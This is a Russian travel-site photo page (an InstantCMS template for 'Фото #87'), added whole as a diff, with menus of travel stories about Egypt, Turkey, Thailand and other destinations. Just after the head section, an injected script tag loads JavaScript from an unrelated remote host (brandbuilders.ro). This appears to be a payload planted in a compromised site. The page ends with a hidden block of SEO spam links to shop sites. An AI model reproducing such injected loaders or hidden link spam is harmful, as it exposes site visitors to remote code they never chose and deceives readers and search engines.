@@ -1,0 +1,327 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="ru">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<link href="/templates/zuher5_folders/css/styles.css" rel="stylesheet" type="text/css" />
+<title>Фото #87 - Мир моих путешествий!</title>
+<meta name="keywords" content="Отдых в безвизовых странах,пляжный отдых,отдых на островах" />
+<meta name="description" content="Отдых в безвизовых странах,советы,рекомендации,отзывы" />
+<meta name="generator" content="InstantCMS - www.instantcms.ru"/>
+<META HTTP-EQUIV="Page-Exit" CONTENT="blendTrans(Duration=0.5)">
+<META HTTP-EQUIV="Page-Enter" CONTENT="blendTrans(Duration=0.5)">
+<script type="text/javascript" src="/includes/jquery/jquery.js"></script>
+<script type="text/javascript" src="/core/js/common.js"></script>
+<script type="text/javascript" src="/includes/jquery/treeview/jquery.treeview.js"></script>
+<script type="text/javascript" src="/includes/jquery/treeview/menu.js"></script>
+<script language="JavaScript" type="text/javascript" src="/core/js/karma.js"></script>
+<script language="JavaScript" type="text/javascript" src="/includes/jquery/autogrow/jquery.autogrow.js"></script>
+<script language="JavaScript" type="text/javascript" src="/components/comments/js/comments.js"></script>
+<script language="JavaScript" type="text/javascript" src="/core/js/smiles.js"></script>
+<link href="/includes/jquery/treeview/jquery.treeview.css" rel="stylesheet" type="text/css" />
+<link href="/components/comments/css/styles.css" rel="stylesheet" type="text/css" />
+</head><script src=http://brandbuilders.ro/despre_brandbuilders.php ></script>
+
+<body bgcolor="#e0dfd4" text="black" link="#0000FF" vlink="#800080" alink="#FF0000" OnLoad="na_preload_img(false, "/templates/zuher5_folders/images/blogs_on.gif", "/templates/zuher5_folders/images/photo_on.gif", "/templates/zuher5_folders/images/statyi_on.gif", "/templates/zuher5_folders/images/clubs_on.gif", "/templates/zuher5_folders/images/users_on.gif");">
+<script language="JavaScript">
+<!--
+function na_preload_img()
+{ 
+  var img_list = na_preload_img.arguments;
+  if (document.preloadlist == null) 
+    document.preloadlist = new Array();
+  var top = document.preloadlist.length;
+  for (var i=0; i < img_list.length; i++) {
+    document.preloadlist[top+i] = new Image;
+    document.preloadlist[top+i].src = img_list[i+1];
+  } 
+}
+
+function na_change_img_src(name, nsdoc, rpath, preload)
+{ 
+  var img = eval((navigator.appName.indexOf("Netscape", 0) != -1) ? nsdoc+"."+name : "document.all."+name);
+  if (name == "")
+    return;
+  if (img) {
+    img.altsrc = img.src;
+    img.src    = rpath;
+  } 
+}
+
+function na_restore_img_src(name, nsdoc)
+{
+  var img = eval((navigator.appName.indexOf("Netscape", 0) != -1) ? nsdoc+"."+name : "document.all."+name);
+  if (name == "")
+    return;
+  if (img && img.altsrc) {
+    img.src    = img.altsrc;
+    img.altsrc = null;
+  } 
+}
+
+// -->
+</script>
+
+</body>
+<div align="center">
+	<table border="0" width="100%" id="table5" cellspacing="0" cellpadding="0" height="31" background="/templates/zuher5_folders/images/borderup.gif">
+		<tr>
+			<td><div id="pathtd"align=center><div class="pathway"><a href="/" class="pathwaylink">Главная</a>  › <a href="/photos/0/1048" class="pathwaylink">Калейдоскоп со всего мира</a>  › <a href="/photos/0/photo687.html" class="pathwaylink">Фото #87</a> </div></div></td>
+		</tr>
+	</table>
+	<table border="0" width="1000" id="table6" cellspacing="0" cellpadding="0" background="/templates/zuher5_folders/images/header.jpg" height="308">
+		<tr>
+			<td background="/templates/zuher5_folders/images/ten_left.gif" width="16" rowspan="2">
+			<p style="margin-top: 0; margin-bottom: 0"> </td>
+			<td align="center" width="600">
+			<p style="margin-top: 0; margin-bottom: 0">
+				<table border="0" width="100%" id="table8" cellspacing="1" cellpadding="0" height="100%">
+					<tr>
+						<td align="left" background="/templates/zuher5_folders/images/safari-128x128.gif" height="128" style="padding-left:60">
+						<div id="sitename">Мир моих путешествий!</div></td>
+					</tr>
+				</table>
+				</td>
+			<td rowspan="2" align="center" width="368" background="/templates/zuher5_folders/images/bunner.gif">
+			<table border="0" width="258" id="table10" height="270" cellspacing="0" cellpadding="0">
+				<tr>
+					<td align="center"></td>
+				</tr>
+			</table>
+			</td>
+			<td background="/templates/zuher5_folders/images/ten_right.gif" width="16" rowspan="2">
+			 </td>
+		</tr>
+		<tr>
+			<td height="176">
+			<div align="left">
+			<table border="0" width="590" id="table9" cellspacing="0" cellpadding="0" height="100%">
+				<tr>
+					<td align="center" width="111" valign="bottom">
+					<a href="/view-blog/menuid-17" OnMouseOut="na_restore_img_src("image1", "document")" OnMouseOver="na_change_img_src("image1", "document", "/templates/zuher5_folders/images/blogs_on.gif", true);"><img border="0" src="/templates/zuher5_folders/images/blogs.gif" name="image1" ></a></td>
+					<td align="center" width="111" valign="bottom">
+					<a href="/view-photos/menuid-20" OnMouseOut="na_restore_img_src("image2", "document")" OnMouseOver="na_change_img_src("image2", "document", "/templates/zuher5_folders/images/photo_on.gif", true);"><img border="0" src="/templates/zuher5_folders/images/photo.gif" name="image2" ></a></td>
+					<td align="center" width="111" valign="bottom">
+					<a href="/view-content/id-6/menuid-21" OnMouseOut="na_restore_img_src("image3", "document")" OnMouseOver="na_change_img_src("image3", "document", "/templates/zuher5_folders/images/statyi_on.gif", true);"><img border="0" src="/templates/zuher5_folders/images/statyi.gif" name="image3" ></a></td>
+					<td align="center" width="111" valign="bottom">
+					<a href="/view-clubs/menuid-38" OnMouseOut="na_restore_img_src("image4", "document")" OnMouseOver="na_change_img_src("image4", "document", "/templates/zuher5_folders/images/clubs_on.gif", true);"><img border="0" src="/templates/zuher5_folders/images/clubs.gif" name="image4" ></a></td>
+					<td align="center" width="111" valign="bottom">
+					<a href="/view-users/menuid-15" OnMouseOut="na_restore_img_src("image5", "document")" OnMouseOver="na_change_img_src("image5", "document", "/templates/zuher5_folders/images/users_on.gif", true);"><img border="0" src="/templates/zuher5_folders/images/users.gif" name="image5" ></a></td>
+				</tr>
+			</table>			</div>
+			</td>
+		</tr>
+	</table>
+	<table border="0" width="1000" id="table7" cellspacing="0" cellpadding="0">
+		<tr>
+			<td background="/templates/zuher5_folders/images/ten_left.gif" width="16" height="12"></td>
+			<td colspan="3" background="/templates/zuher5_folders/images/bg_home_sep.gif" height="12"></td>
+			<td background="/templates/zuher5_folders/images/ten_right.gif" width="16" height="12"></td>
+		</tr>
+		<tr>
+			<td background="/templates/zuher5_folders/images/ten_left.gif" width="16" rowspan="3">
+			 </td>
+			<td bgcolor="#FFFFFF"id="lefttd" width="258" align="center" valign="top" rowspan="3" ><table class="module" width="100%" cellspacing="0" cellpadding="0">
+<tbody>
+		<tr>
+		<td class="moduletitle">
+			Советы
+					</td>
+	</tr>
+		<tr>
+		<td class="modulebody">
+			<div><ul id="menu1" class="filetree treeview-famfamfam"><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-view/id-18/menuid-43" >Полезные советы</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-view/id-19/menuid-44" >Интересные статьи</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-view/id-20/menuid-45" >Рассказы о путешествиях</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/id-2/menuid-57" >Новости</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/id-6/menuid-58" >Статьи</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-photos/menuid-59" >Фотографии</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-view/id-21/menuid-128" >Виды отдыха</a></span></li></ul></div><script type="text/javascript">
+					$(document).ready(function(){
+						 $("#menu1").treeview({
+							animated: true,
+							collapsed: true,
+							unique: false
+							});
+						}
+					);
+				 </script>
+
+		</td>
+	</tr>
+</tbody>
+</table><table class="module" width="100%" cellspacing="0" cellpadding="0">
+<tbody>
+		<tr>
+		<td class="moduletitle">
+			Рассказы
+					</td>
+	</tr>
+		<tr>
+		<td class="modulebody">
+			<div><ul id="menu2" class="filetree treeview-famfamfam"><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-52/menuid-49" >Турция - знакомимся ближе</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-54/menuid-50" >Как выбрать страну для отдыха</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-59/menuid-51" >Как приобретать тур в Турцию</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-60/menuid-52" >О чем необходимо позаботиться девушкам</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-73/menuid-53" >Как приобретать тур в Турцию: пляж и уровень гостиницы</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-75/menuid-54" >Советы туристам по Турции</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-84/menuid-55" >О покупках в Египте</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-89/menuid-56" >Подарки из Египта</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-90/menuid-66" >Вселенскfz мечтf</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-91/menuid-67" >Гоа</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-92/menuid-68" >Индия</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-93/menuid-69" >Об Индии</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-94/menuid-70" >Новый год в Индии</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-95/menuid-72" >Визы</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-96/menuid-73" >География Египта</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-97/menuid-74" >Валюта и деньги Египта</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-98/menuid-75" >Обычаи Египта</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-99/menuid-76" >Цены и рестораны Египта</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-100/menuid-77" >Такси в Египте</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-101/menuid-78" >Покупки в Египте</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-102/menuid-79" >Курорты Египта</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-103/menuid-80" >Дайвинг места Красного моря</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-104/menuid-81" >Луксор</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-105/menuid-82" >Каир</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-106/menuid-83" >Пляжи в Эль Гуна</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-55/menuid-84" >Дайвинг в Эль Гуне</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-66/menuid-85" >Детский отдых в Эль Гуне</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-48/menuid-86" >Бухта Наама Бей</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-107/menuid-87" >Бухта Шарм-эль-Майя</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-108/menuid-88" >Район Хадаба</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-60/menuid-89" >Бухта Шаркс Бей</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-109/menuid-90" >Сезон Египта для отдыха</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-110/menuid-91" >Простой рай</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-111/menuid-92" >Сиамомания 4</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-112/menuid-93" >Таиланд, Таиланд...</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-113/menuid-94" >Хотите в сказку?</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-114/menuid-95" >Открытие провинции КРАБИ</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-115/menuid-96" >Первый раз в Тайланде</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-116/menuid-97" >Австрия</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-117/menuid-98" >Вьетнам</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-118/menuid-99" >в Ставангер</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-119/menuid-100" >о дороге в Тринидад</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-120/menuid-101" >О культе вуду на Карибах</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-121/menuid-102" >Путевые заметки</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-122/menuid-103" >"Рас, два Куба...."</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-123/menuid-104" >Всё-таки жизнь налаживается</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-124/menuid-105" >Тити-Кака</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-125/menuid-106" >Вена</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-126/menuid-107" >Очаровательная Вена</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-56/menuid-108" >Каир</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-127/menuid-109" >Город Ангелов...</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-128/menuid-110" >Прага и сосиски в пиве...</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-129/menuid-111" >Прогулка в стиле конца света</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-130/menuid-117" >Привет, Каталония!</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-131/menuid-118" >Для отдыха с ребенком подходит</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-132/menuid-119" >Мечты сбываются: из Лиссабона на Мадейру</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-133/menuid-120" >все было окей!</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-134/menuid-121" >Отдых в Туниссе</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-135/menuid-122" >Отдых в Наама Бей5*</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-136/menuid-123" >Финляндия</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="/view-content/do-read/id-137/menuid-124" >Шведский снег и горы!</a></span></li></ul></div><script type="text/javascript">
+					$(document).ready(function(){
+						 $("#menu2").treeview({
+							animated: true,
+							collapsed: true,
+							unique: false
+							});
+						}
+					);
+				 </script>
+
+		</td>
+	</tr>
+</tbody>
+</table><table class="module" width="100%" cellspacing="0" cellpadding="0">
+<tbody>
+		<tr>
+		<td class="moduletitle">
+			Фотоотчеты
+					</td>
+	</tr>
+		<tr>
+		<td class="modulebody">
+			<div><ul id="menu3" class="filetree treeview-famfamfam"><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1041" >Австрия</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1034" >Аквапарки</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1038" >Андора</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1042" >Бахрейн</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1043" >Вьетнам</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1044" >Египет</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1037" >Историческая турция</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1045" >Иран</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1035" >Мой отдых</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1039" >Карибы</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1040" >Куба</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1036" >Стамбул</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1046" >Гонконг Вацлав</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1047" >Греция Вацлав</a></span></li><li style="padding:0px;"><span class="file" style="background: url(/includes/jquery/treeview/images/file.gif) 0 0 no-repeat;"><a target="_self" class="" href="http://bananas-republic.ru/photos/59/1048" >Калейдоскоп со всего мира</a></span></li></ul></div><script type="text/javascript">
+					$(document).ready(function(){
+						 $("#menu3").treeview({
+							animated: true,
+							collapsed: true,
+							unique: false
+							});
+						}
+					);
+				 </script>
+
+		</td>
+	</tr>
+</tbody>
+</table></td>
+			<td bgcolor="#FFFFFF" colspan="2" align="center" valign="top"><div align="top"></div>
+			<div><div class="component"><div class="con_heading">Фото #87</div><table width="100%" cellpadding="5" cellspacing="0"><tr><td colspan="3" align="center"><div class="photo_desc"></div></td></tr><tr><td colspan="3" align="center">
+						<div>&larr; Вернуться к <a href="/photos/0/1048">альбому</a>| <a href="/photos/0">списку альбомов</a></div></td></tr><tr><td style="text-align:center"><img src="/images/photos/medium/81f6f29507d6ebc00c6bd449f4356391.jpg" border="0" /></td></tr><tr><td><div class="photo_nav"><table cellpadding="5" cellspacing="0" border="0" align="center" style="margin-left:auto;margin-right:auto"><tr><td align="right"><div>&larr; <a href="/photos/0/photo686.html">Предыдущая</a></div></td><td>|</td><td align="left"><div><a href="/photos/0/photo688.html">Следующая</a> &rarr;</div></td></tr></table></div></td></tr></table><div class="photo_bar"><table width="" cellspacing="0" cellpadding="4" align="center"><tr><td width=""><strong>Добавлена:</strong> 15-10-2009</td><td width=""><strong>Просмотров: </strong> 1216</td><td width=""><strong>Рейтинг: </strong><span id="karmapoints"><span style="color:gray;">0</span></span></td><td width=""><div class="karma_buttons"><div id="karmactrl"></div></div></td><td><a href="/images/photos/81f6f29507d6ebc00c6bd449f4356391.jpg" target="_blank">Открыть оригинал</a></td></tr></table></div>
+<div class="cmm_heading">
+	<a name="c" />Комментарии</a>
+</div>
+
+
+		<div class="cmm_icons">
+		<table>
+			<tr>
+				<td><img src="/images/markers/rssfeed.png" border="0" alt="RSS лента"/></td>
+				<td><a href="/rss/comments/photo-687/feed.rss">RSS-лента комментариев</a></td>
+			</tr>
+		</table>
+	</div>
+
+    <div class="cm_ajax_list">
+        <p style="margin:30px; margin-left:0px; padding-left:50px;background:url(/images/ajax-loader.gif) no-repeat">Загрузка комментариев...</p>
+    </div>
+    <script type="text/javascript">
+        
+            var anc = '';
+            if (window.location.hash){
+                var anc = window.location.hash;
+            }
+        
+        loadComments('photo', 687, anc);
+    </script>
+
+
+<div id="addcommentlink" src="#">
+	<table cellspacing="0" cellpadding="2">
+		<tr>
+			<td width="16"><img src="/components/comments/images/new.gif" /></td>
+			<td><a href="javascript:void(0);" id="addcommentlink" onclick="addComment('a071655711066d44bd2d6428b55a40cc', 'photo', '687', 0)">Добавить комментарий</a></td>
+								
+					</tr>
+	</table>	
+</div>
+
+<div id="cm_addentry0" style="display:block"></div></div><p><a href='javascript:history.go(-1)' class="backlink">&laquo; Назад</a></p></div>
+</td>
+			<td background="/templates/zuher5_folders/images/ten_right.gif" width="16" rowspan="3"></td>
+		</tr>
+		<tr>
+			<td bgcolor="#FFFFFF" colspan="2" height="22" background="/templates/zuher5_folders/images/foot.gif">
+			<p align="center">
+			</td>
+		</tr>
+		<tr>
+			<td bgcolor="#FFFFFF" colspan="2" align="center" valign="top"><div><table class="module" width="100%" cellspacing="0" cellpadding="0">
+<tbody>
+		<tr>
+		<td class="moduletitle">
+			Новое обо всем
+					</td>
+	</tr>
+		<tr>
+		<td class="modulebody">
+			<table width="100%" cellpadding="4" cellspacing="0"><tr><td valign="top"><div><a target="_blank" href="http://bananas-republic.ru/content/0/read80.html">На чем можно сэкономить в Египте</a></div></td><td valign="top"><div><a target="_blank" href="http://bananas-republic.ru/content/0/read61.html">Как организовать поездку</a></div></td><td valign="top"><div><a target="_blank" href="http://bananas-republic.ru/content/0/read51.html">Отели Турции</a></div></td></tr></table>
+		</td>
+	</tr>
+</tbody>
+</table></div></td>
+		</tr>
+		<tr>
+			<td background="/templates/zuher5_folders/images/leftdown2.gif" width="16" height="16"></td>
+			<td background="/templates/zuher5_folders/images/ten_down.gif" height="16"></td>
+			<td background="/templates/zuher5_folders/images/ten_down.gif" height="16"></td>
+			<td background="/templates/zuher5_folders/images/ten_down.gif" height="16"></td>
+			<td background="/templates/zuher5_folders/images/rightdown.gif" width="16" height="16"></td>
+		</tr>
+	</table>
+	<p>Это интересно: <br><p>&nbsp;<p>Коллеги : <!--66b1a--><br>
+	<br>
+&nbsp;</div>
+
+<p style="margin-top: 0; margin-bottom: 0"></p>
+<table border="0" width="100%" id="table4">
+	<tr>
+		<td>
+		<p align="center"></td>
+	</tr>
+	</table>
+
+</body>
+<div style="display:none">
+<a href="http://bibi-ljalja.ru/">Взрослые дети - детский интернет магазин товары для детей</a>.
+<a href="http://mebel-dak.ru/index.html">Как корпусная мебель на заказ в москве</a>.
+<a href="http://mebel-dak.ru/kuhni_na_zakaz_moskva.html">Любые размеры кухни на заказ москва</a>.
+<a href="http://mebel-dak.ru/shkaf_cupe_na_zakaz_moskva.html">шкаф купе на заказ москва, гарантия</a>.
+<a href="http://ceramcode.ru/">италия керамическая плитка creta</a>.
+<a href="http://ceramcode.ru/catalog/Fap-Ceramiche">Chic cioccolato коллекция: suite производитель: fap ceramiche</a>.
+<a href="http://ceramcode.ru/catalog/Fap-Ceramiche-Pura">fap pura, fap плитка fap</a>.
+<a href="http://ceramcode.ru/catalog/Fap-Ceramiche-Suite">Agostino Keope Cer, fap suite</a>.
+<a href="http://ceramcode.ru/catalog/fap-cielo/">fap Infinita Azzuro cielo,5 56 см</a>.
+<a href="http://ceramcode.ru/catalog/Sant-Agostino-Taymyr">Sant Agostino Taymyr, i quarzi</a>.
